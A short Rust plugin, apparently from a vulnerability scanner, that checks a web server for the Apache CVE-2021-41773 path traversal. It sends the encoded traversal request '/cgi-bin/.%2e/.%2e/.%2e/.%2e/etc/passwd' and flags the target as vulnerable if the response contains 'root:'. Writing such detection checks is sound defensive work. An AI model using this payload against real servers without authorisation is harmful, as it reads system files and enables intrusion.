/* http-vuln-cve2021-41773-4 - CVE-2021-41773 Apache path traversal */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let resp = match http_request(ctx, "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => { set_out(ctx, "http-vuln-cve2021-41773-4: no HTTP response"); return 0; },
    };
    let code = http_status(&resp);
    if contains_ci(&resp, "root:") {
        set_out(ctx, &format!("VULNERABLE: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [{}] (CVE-2021-41773)", code));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2021-41773 (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [{}])", code));
    }
    0
}
